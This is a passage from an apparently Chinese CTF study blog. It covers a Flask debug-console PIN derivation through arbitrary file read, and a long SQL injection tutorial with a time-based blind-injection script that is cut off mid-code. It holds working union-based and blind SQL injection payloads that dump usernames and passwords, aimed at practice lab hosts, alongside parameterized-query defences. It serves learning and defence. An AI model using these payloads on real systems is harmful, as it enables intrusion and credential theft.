class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>至于这6个参数这样获得：</p>
<p>1）首先通过dirsearch探测到存在file目录</p>
<p>​<img src="/assets/wps2-20231017104858-81ff2k5.jpg">​</p>
<p>访问后给出提示</p>
<p>​<img src="/assets/wps3-20231017104858-vbj9ot7.jpg">​</p>
<p>2）尝试任意文件读取，很明显只有一个root用户具有登录权限，所以它很明显就是启动这个Flask的用户。</p>
<p>​<img src="/assets/wps4-20231017104858-9epe0bt.jpg">​</p>
<p>3）而从首页的debug报错页面又可以得到flask目录下的一个app.py的绝对路径</p>
<p>​<img src="/assets/wps5-20231017104858-107dcsl.jpg">​</p>
<p>4）&#x2F;file?filename&#x3D;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 读取第五个参数</p>
<p>​<img src="/assets/wps6-20231017104858-tozokxg.jpg">​</p>
<p>但这个值得注意的是需要将冒号去掉，然后转为十进制</p>
<p>​<img src="/assets/wps7-20231017104858-f2dfssh.jpg">​</p>
<p>5）&#x2F;file?filename&#x3D;&#x2F;etc&#x2F;machine-id获得的值与&#x2F;file?filename&#x3D;&#x2F;proc&#x2F;self&#x2F;cgroup获得的容器id进行拼接，结果：6a7b652f3677464382b49ac8dc35ba0f4c56263c62231cb4bcc1223c454dd50a3176463b7342f00dc64795372edd9a7f</p>
<p>运行结果</p>
<p>​<img src="/assets/wps8-20231017104858-4jl8gjv.jpg">​</p>
<p>回到首页</p>
<p>​<img src="/assets/wps9-20231017104858-mmuo8n3.jpg">​</p>
<p>单击这个图标输入我们得到的pin码就可以进入控制终端了，通过popen进行执行命令。</p>
<p>​<img src="/assets/wps10-20231017104858-6i6229s.jpg">​</p>
<p>Flag：flag{873894c49201cd995ee2c52e6270630d}</p>
<p>补充：</p>
<p>​<img src="/assets/wps11-20231017104858-f0ggh2m.jpg">​</p>
<p>非预期：</p>
<p>​<img src="/assets/wps12-20231017104858-wc0g1ux.jpg">​</p>
<p>任意文件读取环境变量，可以直接读取到flag。</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/GET%E4%BC%A0%E5%8F%82/</url>
    <content><![CDATA[<h1 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h1><h1 id="GET传参-1"><a href="#GET传参-1" class="headerlink" title="GET传参"></a>GET传参</h1><h2 id="一，介绍"><a href="#一，介绍" class="headerlink" title="一，介绍"></a>一，介绍</h2><p>GET传参是一种http的请求方式，是基础中的基础，在后面的题目如PHP代码的绕过，或者<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>里都会用到。</p>
<p><img src="/assets/image-20230611110624-mw9nj3u.png" alt="image.png"></p>
<p><strong>?what&#x3D;flag</strong></p>
<p>这里贴一道bugku的web题中的GET题，读代码显然是需要一个名为what的变量，变量的值为flag，而得到what变量值的方法就是GET<br>所以我们需要在URL后面加上?what&#x3D;flag，即 123.206.87.240:8002&#x2F;get&#x2F;?what&#x3D;flag。</p>
<h2 id="二，总结"><a href="#二，总结" class="headerlink" title="二，总结"></a>二，总结</h2><p>所以对于GET方法请求的参数，传参的方法就是URL后面加上 ?参数名&#x3D;参数值。</p>
<h2 id="三，例题"><a href="#三，例题" class="headerlink" title="三，例题"></a>三，例题</h2><h3 id="1-BUUCTF-Havefun"><a href="#1-BUUCTF-Havefun" class="headerlink" title="1.BUUCTF-Havefun"></a>1.BUUCTF-Havefun</h3><p><img src="/assets/image-20230611110935-om5ws4d.png" alt="image.png"></p>
<p><img src="/assets/image-20230611111227-i0xle9b.png" alt="image.png"></p>
<h4 id="1-查看网页源代码（ctrl-u）"><a href="#1-查看网页源代码（ctrl-u）" class="headerlink" title="1.查看网页源代码（ctrl+u）"></a>1.查看网页源代码（ctrl+u）</h4><p>向下拖动<a href="https://so.csdn.net/so/search?q=%E6%BB%91%E5%9D%97&spm=1001.2101.3001.7020">滑块</a>，在网页源代码的末尾我们可以看到如下注释信息：</p>
<p><img src="/assets/image-20230611111127-07ydkdd.png" alt="image.png"></p>
<p>这是一段 PHP 代码。</p>
<ol>
<li>$_GET 是 PHP 中预定义的变量，包含了通过 GET 方式提交的信息。</li>
<li>echo ‘Syc{cat_cat_cat_cat}’; 有些像 flag 的样子，不管最后是不是直接打印 Syc{cat_cat_cat_cat} ，我们都试一试。</li>
</ol>
<p><img src="/assets/image-20230611111337-7i6e06j.png" alt="image.png"></p>
<h4 id="Flag-flag-df75a014-abed-44e4-b28e-b97b29c9b1ce"><a href="#Flag-flag-df75a014-abed-44e4-b28e-b97b29c9b1ce" class="headerlink" title="Flag:flag{df75a014-abed-44e4-b28e-b97b29c9b1ce}"></a>Flag:flag{df75a014-abed-44e4-b28e-b97b29c9b1ce}</h4>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8-20230711220255-5v4zto5/</url>
    <content><![CDATA[<h1 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h1><p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h1 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h1><h1 id="一，概述"><a href="#一，概述" class="headerlink" title="一，概述"></a>一，概述</h1><p>SQL注入（SQL Injection）是一种常见的安全漏洞，它允许攻击者通过在应用程序的输入字段中插入恶意的SQL代码来执行非法的数据库操作。这种漏洞通常出现在使用动态生成SQL查询的应用程序中，而不是正确地使用参数化查询或预编译语句。</p>
<p>攻击者可以通过输入恶意的SQL语句来利用SQL注入漏洞。这些语句可以绕过应用程序的输入验证，直接与后端数据库进行交互。攻击者可以通过注入恶意代码来执行各种操作，如绕过身份验证、访问、修改或删除敏感数据，甚至完全控制数据库服务器。</p>
<h1 id="二，攻击示例"><a href="#二，攻击示例" class="headerlink" title="二，攻击示例"></a>二，攻击示例</h1><p>以下是一个示例，说明了一个受到SQL注入攻击的简单应用程序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名: &quot;</span>)</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造SQL查询</span></span><br><span class="line">sql = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; AND password=&#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL查询并验证用户</span></span><br><span class="line">result = execute_sql_query(sql)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录失败&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个例子中，如果攻击者在用户名或密码字段中输入恶意的SQL代码，就可以改变原始的查询意图。例如，如果攻击者输入<code>&#39; OR &#39;1&#39;=&#39;1</code>作为用户名和密码，构造出的SQL查询将会变成</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个查询的条件’1’&#x3D;’1’永远为真，导致应用程序认为用户已成功登录，即使没有提供有效的用户名和密码。</p>
<h1 id="三，防护"><a href="#三，防护" class="headerlink" title="三，防护"></a>三，防护</h1><p>为了防止SQL注入攻击，应该采取以下措施之一或组合使用：</p>
<p>1.使用参数化查询或预编译语句：这些查询方式会将用户输入作为参数传递给查询语句，而不是直接将其嵌入到SQL代码中。这样可以防止恶意代码注入。</p>
<p>2.输入验证和过滤：对于用户输入的数据，应该进行验证和过滤，只允许特定的字符或格式。可以使用正则表达式或特定的输入验证库来实现。</p>
<p>3.最小权限原则：在数据库设置中，使用最小权限原则为应用程序提供访问数据库的权限。确保应用程序只能执行必要的数据库操作，而不能对整个数据库进行完全访问。</p>
<p>4.定期更新和维护：及时更新和维护应用程序和相关组件，以修复已知的安全漏洞，并及时应用安全补丁。</p>
<p>综上所述，SQL注入是一种严重的安全威胁，但通过采取适当的防护措施，可以有效地防止此类攻击。</p>
<h2 id="利用方法一进行防护："><a href="#利用方法一进行防护：" class="headerlink" title="利用方法一进行防护："></a>利用方法一进行防护：</h2><p>当使用参数化查询或预编译语句时，可以将用户输入作为参数传递给查询，而不是将其直接嵌入到SQL代码中。这样可以防止恶意代码注入。以下是将上述例子改为使用参数化查询的示例（假设使用Python和SQLite数据库）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到数据库</span></span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取用户输入</span></span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名: &quot;</span>)</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用参数化查询</span></span><br><span class="line">sql = <span class="string">&quot;SELECT * FROM users WHERE username=? AND password=?&quot;</span></span><br><span class="line">params = (username, password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行查询</span></span><br><span class="line">cursor.execute(sql, params)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取查询结果</span></span><br><span class="line">result = cursor.fetchone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录失败&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭数据库连接</span></span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个示例中，使用了参数化查询的方式来构造SQL查询语句。用户名和密码被作为参数传递给<code>execute</code>方法，而不是直接嵌入到查询语句中。这样可以确保用户输入不会被解释为SQL代码，从而防止SQL注入攻击。</p>
<h1 id="万能公式"><a href="#万能公式" class="headerlink" title="万能公式"></a>万能公式</h1><p>1 and 1&#x3D;1<br>1’ and ‘1’&#x3D;’1<br>1 or 1&#x3D;1<br>1’ or ‘1’&#x3D;’1</p>
<h1 id="数字型和字符型的SQL注入"><a href="#数字型和字符型的SQL注入" class="headerlink" title="数字型和字符型的SQL注入"></a>数字型和字符型的SQL注入</h1><p>数字型和字符型的SQL注入是基于输入数据类型的不同方式进行攻击的。下面分别详细介绍这两种类型的SQL注入。</p>
<ol>
<li>数字型SQL注入：<br>数字型SQL注入通常发生在应用程序没有正确验证和处理用户输入的数字数据时。攻击者利用这个漏洞来执行非法的数据库操作。以下是一个示例：</li>
</ol>
<p>假设应用程序接收一个用户输入的数字，然后将其用于构造SQL查询，但没有进行输入验证和处理：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_id = <span class="built_in">input</span>(<span class="string">&quot;请输入用户ID: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造SQL查询</span></span><br><span class="line">sql = <span class="string">&quot;SELECT * FROM users WHERE id = &quot;</span> + input_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL查询</span></span><br><span class="line">result = execute_sql_query(sql)</span><br></pre></td></tr></table></figure>

<p>如果攻击者在输入字段中输入了恶意代码，例如输入<code>1 OR 1=1</code>, 则构造的SQL查询将变为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这个查询的条件<code>1=1</code>永远为真，<strong>导致返回所有用户的记录</strong>，而不仅仅是具有指定ID的用户。</p>
<p>防止数字型SQL注入的关键是对输入进行验证和处理。确保只接受预期的数字输入，并使用参数化查询或预编译语句来构造查询，而不是直接将用户输入嵌入到SQL代码中。</p>
<ol start="2">
<li>字符型SQL注入：<br>字符型SQL注入是<strong>最常见的SQL注入类型</strong>，通常发生在应用程序没有正确处理用户输入的字符数据时。攻击者利用这个漏洞来插入恶意的SQL代码。以下是一个示例：</li>
</ol>
<p>假设应用程序接收一个用户输入的用户名，并将其用于构造SQL查询，但没有进行输入验证和处理：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">input_username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造SQL查询</span></span><br><span class="line">sql = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + input_username + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行SQL查询</span></span><br><span class="line">result = execute_sql_query(sql)</span><br></pre></td></tr></table></figure>

<p>如果攻击者在用户名字段中输入了恶意代码，例如输入<code>&#39; OR &#39;1&#39;=&#39;1</code>, 则构造的SQL查询将变为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个查询的条件<code>&#39;1&#39;=&#39;1&#39;</code>永远为真，导致返回所有用户的记录，而不仅仅是具有指定用户名的用户。</p>
<p>防止字符型SQL注入的关键是对输入进行验证、过滤和转义。确保只接受预期的字符输入，并在构造SQL查询时使用参数化查询或预编译语句，以避免直接将用户输入嵌入到SQL代码中。另外，还可以使用数据库提供的转义函数或库来转义特殊字符，以防止注入攻击。</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1-极客大挑战-2019-EasySQL1"><a href="#1-极客大挑战-2019-EasySQL1" class="headerlink" title="1.[极客大挑战 2019]EasySQL1"></a>1.[极客大挑战 2019]EasySQL1</h2><p>1.打开页面看到如下界面， <strong>有两个功能点且参数可控，允许上传</strong> ，（这也是<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>的基础）很明显与数据库存在信息交互，想到sql注入。</p>
<p><img src="/assets/image-20230618191439-1449z88.png" alt="image.png"></p>
<ol start="2">
<li>随便输入一个用户名和密码，通过网址可以判断出该请求是get的方式<br>​<img src="/assets/image-20230618191555-6a3enyv.png" alt="image.png"></li>
<li>直接使用万能密码测试是否存在SQL注入漏洞：</li>
</ol>
<p><img src="/assets/image-20230618191700-a67gkrk.png" alt="image.png"></p>
<p>4.getshell</p>
<p><img src="/assets/image-20230618191719-cc541di.png" alt="image.png"></p>
<p>‍</p>
<h1 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h1><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> b <span class="keyword">union</span> <span class="keyword">select</span> c <span class="keyword">from</span> d <span class="keyword">where</span> e;</span><br></pre></td></tr></table></figure>

<p>大致就是这样 显然union会一次显示两个查询结果我们可以使得第一个查询语句作为正常内容，第二个作为查询语句来进行构造。</p>
<h2 id="联合查询的使用条件"><a href="#联合查询的使用条件" class="headerlink" title="联合查询的使用条件"></a>联合查询的使用条件</h2><p>当页面对<strong>不同的查询语句有不同的结果时</strong>可以使用，因为我们根据需要每一步的返回结果来判断和进行下一步操作.</p>
<h2 id="union注入流程"><a href="#union注入流程" class="headerlink" title="union注入流程"></a>union注入流程</h2><p>依次判断类型，字段数，回显点，依次爆库名，表名，字段名，数据.</p>
<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230711221339-bo1nrl2.png" alt="image">​</p>
<p>​<img src="/assets/image-20230711221408-flxtdpk.png" alt="image">​</p>
<p>​<img src="/assets/image-20230711221420-nx8l17t.png" alt="image">​</p>
<p>首先输入id为1，<strong>然后用单引号闭合发现报错 将单引号注释掉后恢复正常</strong>，其原因在上一篇中有提到，输入 ’ 后使得sql语句中多了一个单引号造成错误，而注释掉后面内容后又恢复正常，说明输入的单引号与前面的id&#x3D;1也形成了一个闭合，<strong>因此可以判断注入类型为字符型，闭合方式为单引号.</strong></p>
<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure>

<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们要对字段数进行判断<br>我们使用的是 <strong>order by number</strong> 其作用为输出第number列.</p>
<p>​<img src="/assets/image-20230711222344-rynv7ml.png" alt="image">​</p>
<p>可以看到此时页面正常，我们增加number直到报错，那么此时number-1即为字段数</p>
<p>​<img src="/assets/image-20230711222404-jywqofm.png" alt="image">​</p>
<p>可见有3个字段</p>
<h3 id="判断回显点"><a href="#判断回显点" class="headerlink" title="判断回显点"></a>判断回显点</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 limit 1,1 --+</span></span><br><span class="line"><span class="string">id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>当我们知道该表的字段数之后，我们还需要确定在哪个字段出会输出有效信息 可以尝试一下</p>
<p>​<img src="/assets/image-20230711222953-e00i6g7.png" alt="image">​</p>
<p>可以看到我们在union select 后拼接了数字1,2,3 而此时我们看到还加入了limit 1,1 这是为什么呢？<br><strong>联合查询的输出是严格按照顺序进行的，因此当id&#x3D;1存在时会在第0行输出第一个sql语句查询到的结果，自然我们输入的数字就到了下一行</strong><br>而 limit num1，num2的作用为从<strong>第num1行开始显示num2行内容。</strong></p>
<p>​<img src="/assets/image-20230711223351-lgyye6p.png" alt="image">​</p>
<p>​<img src="/assets/image-20230711223416-9pkvfol.png" alt="image">​</p>
<p>我们可以看到2,3被输出了，说明这两个位置都可以作为回显点<br>当然我们也可以不用limit语句，只需让前面sql语句查询结果为空即可 如图</p>
<p>​<img src="/assets/image-20230711223551-k12fl9f.png" alt="image">​</p>
<p>​<img src="/assets/image-20230711223741-qs1nijf.png" alt="image">​</p>
<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>可能判断的时候特殊情况还得留个心眼，但是下面就没啥好说的了，基本都是套路</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230711223950-3fefj6l.png" alt="image">​</p>
<p>database()显示当前库名称<br>也可以使用group_concat() 将所有内容写入一行并输出</p>
<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230711224129-q7d5dqo.png" alt="image">​</p>
<p>解释一下payload：information_schema是mysql自带的库，记录了该数据库<strong>所有的表名和字段名</strong><br>该句的含义为：查找数据库中security库下的所有表名<br>显然结果中的users十分关键。</p>
<h3 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; </span></span><br><span class="line"><span class="string">and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230711224316-v3d971n.png" alt="image">​</p>
<p>同理 该payload可解释为：查询数据库security下表users中的所有字段，显然我们对结果中的uname与pwd很感兴趣。</p>
<h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,0x5c,password),3 from security.users --+</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230711224434-s6076ti.png" alt="image">​</p>
<p>0x5c是\的十六进制编码，为了将uname与pwd分开，也可改成其他任意字符<br>该payload意为：查询security库中users表中字段username与password的所有信息</p>
<p>这时候我们就拿到了我们需要的数据，注入基本完成</p>
<p>‍</p>
<p>‍</p>
<h2 id="get型注入-（协议视角）-–-union"><a href="#get型注入-（协议视角）-–-union" class="headerlink" title="get型注入 （协议视角）  –&gt;union"></a>get型注入 （协议视角）  –&gt;union</h2><p>​<img src="/assets/image-20230924205009-gxtqymo.png" alt="image">​</p>
<p>union select 1,user(),database(),table_name,version(),6,7 from information_schema.tables where table_schema&#x3D;database() – </p>
<p>‍</p>
<p>如果查询table_name只显示一个表名，那么就要用group_concat()函数拼接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username=1<span class="string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230924205229-6kwervt.png" alt="image">​</p>
<p>union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name &#x3D; ‘users’ – </p>
<p>​<img src="/assets/image-20230924205511-13tvxix.png" alt="image">​</p>
<p>union select 1,id,login,4,password,6,7 from users –</p>
<p>‍</p>
<p>​<img src="/assets/image-20230924205654-geku8n8.png" alt="image">​</p>
<h2 id="post注入-（协议视角）"><a href="#post注入-（协议视角）" class="headerlink" title="post注入 （协议视角）"></a>post注入 （协议视角）</h2><p>​<img src="/assets/image-20230924210311-g5kuv2g.png" alt="image">​</p>
<p>​<img src="/assets/image-20230924210818-mtt2nw9.png" alt="image">​</p>
<p>可以测试出为整型。</p>
<p>​<img src="/assets/image-20230924211317-uqd1h7b.png" alt="image">​</p>
<p>​<img src="/assets/image-20230924211516-sxrfl5i.png" alt="image">​</p>
<p>​<img src="/assets/image-20230924211603-yzr4o8c.png" alt="image">​</p>
<h2 id="判断sql注入点以及防御"><a href="#判断sql注入点以及防御" class="headerlink" title="判断sql注入点以及防御"></a>判断sql注入点以及防御</h2><p>​<img src="/assets/image-20230925085312-dngfrma.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925090843-y9i48fh.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925091332-dslt6fg.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925091455-6nx7wta.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925093411-629qzb0.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925093804-gvf3qth.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925094032-s6j3sgz.png" alt="image">​</p>
<h2 id="五种不同的sql注入类型（宏观视角）"><a href="#五种不同的sql注入类型（宏观视角）" class="headerlink" title="五种不同的sql注入类型（宏观视角）"></a>五种不同的sql注入类型（宏观视角）</h2><p>​<img src="/assets/image-20230925094421-0e5f3w6.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925094523-i33axrt.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925094552-5wtxlxd.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925094705-acieayb.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925094748-h32lt16.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925094809-klivmgg.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925094943-kr4gvox.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925095422-qbnwdog.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925100141-m50hkgg.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925100802-zbyilk7.png" alt="image">​</p>
<p><a href="http://192.168.149.136:88/sqli_15.php?title=1%25">http://192.168.149.136:88/sqli_15.php?title=1%</a>‘ or sleep(0.1) –   &amp;action&#x3D;search</p>
<p>​<img src="/assets/image-20230925101140-z2tenxq.png" alt="image">​</p>
<p>​<img src="/assets/image-20230925101325-r01vpcs.png" alt="image">​</p>
<p><a href="http://192.168.149.136:88/sqli_15.php?title=World">http://192.168.149.136:88/sqli_15.php?title=World</a> War Z’ and  length(database())&#x3D;5  and sleep(1) –   &amp;action&#x3D;search</p>
<p>‍</p>
<p>字符比较</p>
<p>​<img src="/assets/image-20230925184751-hrf91il.png" alt="image">​</p>
<p>数字比较</p>
<p>​<img src="/assets/image-20230925184841-yddmyz7.png" alt="image">​</p>
<p>‍</p>
<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># IP 地址对应修改</span></span><br><span class="line">ip_port = <span class="string">&quot;192.168.149.136:88&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;login&quot;</span>: <span class="string">&quot;bee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;bug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security_level&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;form&quot;</span>: <span class="string">&quot;submit&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">urlLogin = <span class="string">&quot;http://%s/login.php&quot;</span> % ip_port</span><br><span class="line"><span class="comment"># 创建一个会话</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="comment"># 发送登录请求</span></span><br><span class="line">resp = session.post(urlLogin, data)</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="comment"># 检查是否成功登录</span></span><br><span class="line"><span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录失败，状态码:&quot;</span>, resp.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_of_database</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and length(database())=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_name_of_database</span>():</span><br><span class="line">    <span class="comment"># 获取数据库名长度</span></span><br><span class="line">    length_of_database = get_length_of_database()</span><br><span class="line">    name_of_database = 